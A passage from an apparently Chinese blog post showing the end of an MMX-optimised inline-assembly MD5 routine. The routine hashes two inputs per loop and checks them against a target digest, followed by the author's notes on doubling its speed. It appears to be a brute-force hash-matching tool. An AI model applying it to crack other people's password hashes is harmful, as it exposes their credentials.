    mov edx,\[dataIn1+12\];  
    //5: mov esi,0xffffffff  
    xor edi,edi;  
    not edi;  
  }  
  //主要轮次  
  \_\_asm  
  {  
    push ebp;  
    mov ebp,LoopNum;  
  }  
Begin:  
  \_\_asm  
  {  
    dec ebp;  
    cmp ebp,0;  
    je End;  
      
    Move0(a,0x67452301);  
    Move0(b,0xefcdab89);  
    Move0(c,0x98badcfe);  
    Move0(d,0x10325476);  
      
    md5\_FF1 (a, b, c, d,  md5\_S11, md5\_S110,0xd76aa478);  
    md5\_FF2 (d, a, b, c,  md5\_S12,  md5\_S120,0xe8c7b756);  
    md5\_FF3 (c, d, a, b,  md5\_S13, md5\_S130,0x242070db);  
    md5\_FF4 (b, c, d, a,  md5\_S14, md5\_S140,0xc1bdceee);  
    md5\_FF0 (a, b, c, d,  md5\_S11,  md5\_S110,0xf57c102f);  
    md5\_FF0 (d, a, b, c, md5\_S12, md5\_S120,0x4787c62a);  
    md5\_FF0 (c, d, a, b, md5\_S13, md5\_S130,0xa8304613);  
    md5\_FF0 (b, c, d, a, md5\_S14, md5\_S140,0xfd469501);  
    md5\_FF0 (a, b, c, d, md5\_S11,md5\_S110, 0x698098d8);  
    md5\_FF0 (d, a, b, c, md5\_S12, md5\_S120,0x8b44f7af);  
    md5\_FF0 (c, d, a, b, md5\_S13,  md5\_S130,0xffff5bb1);  
    md5\_FF0 (b, c, d, a, md5\_S14, md5\_S140,0x895cd7be);  
    md5\_FF0 (a, b, c, d, md5\_S11, md5\_S110,0x6b901122);  
    md5\_FF0 (d, a, b, c, md5\_S12, md5\_S120,0xfd987193);  
    md5\_FF0 (c, d, a, b,md5\_S13, md5\_S130,0xa679440e);  
    md5\_FF0 (b, c, d, a, md5\_S14,  md5\_S140,0x49b40821);  
  
    md5\_GG2 (a, b, c, d,md5\_S21, md5\_S210,0xf61e2562);  
    md5\_GG0 (d, a, b, c, md5\_S22, md5\_S220,0xc040b340);  
    md5\_GG0 (c, d, a, b, md5\_S23, md5\_S230,0x265e5a51);  
    md5\_GG1 (b, c, d, a,md5\_S24, md5\_S240,0xe9b6c7aa);  
    md5\_GG0 (a, b, c, d, md5\_S21, md5\_S210,0xd62f105d);  
    md5\_GG0 (d, a, b, c, md5\_S22, md5\_S220, 0x2441453);  
    md5\_GG0 (c, d, a, b, md5\_S23, md5\_S230,0xd8a1e681);  
    md5\_GG0 (b, c, d, a, md5\_S24, md5\_S240,0xe7d3fc48);  
    md5\_GG0 (a, b, c, d, md5\_S21, md5\_S210,0x21e1cde6);  
    md5\_GG0 (d, a, b, c, md5\_S22, md5\_S220,0xc3370856);  
    md5\_GG4 (c, d, a, b,md5\_S23, md5\_S230,0xf4d50d87);  
    md5\_GG0 (b, c, d, a, md5\_S24, md5\_S240,0x455a14ed);  
    md5\_GG0 (a, b, c, d, md5\_S21, md5\_S210,0xa9e3e905);  
    md5\_GG3 (d, a, b, c,md5\_S22, md5\_S220,0xfcefa3f8);  
    md5\_GG0 (c, d, a, b, md5\_S23, md5\_S230,0x676f02d9);  
    md5\_GG0 (b, c, d, a, md5\_S24,md5\_S240, 0x8d2a4c8a);  
  
    md5\_HH0 (a, b, c, d, md5\_S31, md5\_S310,0xfffa3942);  
    md5\_HH0 (d, a, b, c, md5\_S32, md5\_S320,0x8771f681);  
    md5\_HH0 (c, d, a, b, md5\_S33, md5\_S330,0x6d9d6122);  
    md5\_HH0 (b, c, d, a, md5\_S34, md5\_S340,0xfde5388c);  
    md5\_HH2 (a, b, c, d,md5\_S31, md5\_S310,0xa4beea44);  
    md5\_HH0 (d, a, b, c, md5\_S32, md5\_S320,0x4bded029);  
    md5\_HH0 (c, d, a, b, md5\_S33, md5\_S330,0xf6bb4b60);  
    md5\_HH0 (b, c, d, a, md5\_S34, md5\_S340,0xbebfbc70);  
    md5\_HH0 (a, b, c, d, md5\_S31, md5\_S310,0x289b7ec6);  
    md5\_HH1 (d, a, b, c,md5\_S32, md5\_S320,0xeaa127fa);  
    md5\_HH4 (c, d, a, b,md5\_S33, md5\_S330,0xd4ef3085);  
    md5\_HH0 (b, c, d, a, md5\_S34, md5\_S340, 0x4881d05);  
    md5\_HH0 (a, b, c, d, md5\_S31, md5\_S310,0xd9d4d039);  
    md5\_HH0 (d, a, b, c, md5\_S32, md5\_S320,0xe6db99e5);  
    md5\_HH0 (c, d, a, b, md5\_S33, md5\_S330,0x1fa27cf8);  
    md5\_HH3 (b, c, d, a,md5\_S34, md5\_S340,0xc4ac5665);  
    
        
    md5\_II1 (a, b, c, d,md5\_S41, md5\_S410,0xf4292244);  
    md5\_II0 (d, a, b, c, md5\_S42,  md5\_S420,0x432aff97);  
    md5\_II0 (c, d, a, b, md5\_S43, md5\_S430,0xab942427);  
    md5\_II0 (b, c, d, a, md5\_S44, md5\_S440,0xfc93a039);  
    md5\_II0 (a, b, c, d, md5\_S41, md5\_S410,0x655b59c3);  
    md5\_II4 (d, a, b, c,md5\_S42, md5\_S420,0x8f0ccc92);  
    md5\_II0 (c, d, a, b, md5\_S43, md5\_S430,0xffeff47d);  
    md5\_II2 (b, c, d, a, md5\_S44, md5\_S440,0x85845dd1);  
    md5\_II0 (a, b, c, d, md5\_S41, md5\_S410,0x6fa87e4f);  
    md5\_II0 (d, a, b, c, md5\_S42, md5\_S420,0xfe2ce6e0);  
    md5\_II0 (c, d, a, b, md5\_S43,md5\_S430, 0xa3014314);  
    md5\_II0 (b, c, d, a, md5\_S44, md5\_S440,0x4e0811a1);  
    md5\_II0 (a, b, c, d, md5\_S41,md5\_S410, 0xf7537f02);  
    md5\_II0 (d, a, b, c, md5\_S42,md5\_S420, 0xbd3af235);  
    md5\_II3 (c, d, a, b, md5\_S43, md5\_S430, 0x2ad7d2bb);  
    md5\_II0 (b, c, d, a, md5\_S44, md5\_S440,0xeb86d391);  
    Move0(mm4,0x67452301);  
    \_\_asm paddd mm4,a;  
    Move0(mm5,0xefcdab89);  
    \_\_asm paddd mm5,b;  
    Move0(mm6,0x98badcfe);  
    \_\_asm paddd mm6,c;  
    \_\_asm movd ebx,mm6;  
    \_\_asm psrl mm6,32;  
    \_\_asm movd eax,mm6;  
    Move0(mm6,0x10325476);  
    \_\_asm paddd mm6,d;  
    \_\_asm movd edx,mm6;  
    \_\_asm psrl mm6,32;  
    \_\_asm movd ecx,mm6;  
                    \_\_asm jmp Begin;  
  }  
End:  
  //输出数据  
  \_\_asm  
  {  
    pop ebp;  
    //1:mm4  
    movd esi,mm4;  
    mov \[dataIn1\],esi;  
    psrl mm4,32;  
    movd esi,mm4;  
    mov \[dataIn0\],esi;  
    //2:mm5  
    movd esi,mm5;  
    mov \[dataIn1+4\],esi;  
    psrl mm5,32;  
    movd esi,mm5;  
    mov \[dataIn0+4\],esi;  
    //3:eax:ebx  
    mov \[dataIn0+8\],eax;  
    mov \[dataIn1+8\],ebx;  
    //4:ecx:edx  
    mov \[dataIn0+12\],ecx;  
    mov \[dataIn1+12\],edx;  
    emms;  
  }  
  \_\_asm popad;  
  
  if(memcmp(MD5Result,dataIn0,16) == 0)  return 1;  
  if(memcmp(MD5Result,dataIn1,16) == 0)  return 2;  
  return 3;  
} 

再一次的修改了 md5 算法。  
现在的速度是原先的 2 倍了。  
Md5 算法以及汇编代码的优化参考了：  
MD5 optimized for AMD64: http://etudiant.epita.fr/~bevand\_m/papers/md5-amd64.html   
怎样优化 Pentium 系列处理器的代码:  
http://www.codingnow.com/2000/download/cpentopt.htm  
  
这个程序就到这里为止了。暂时停止。等待更强的兄弟和代码出现。 

 4dd466d0e1e0cc123afbe504da2462ca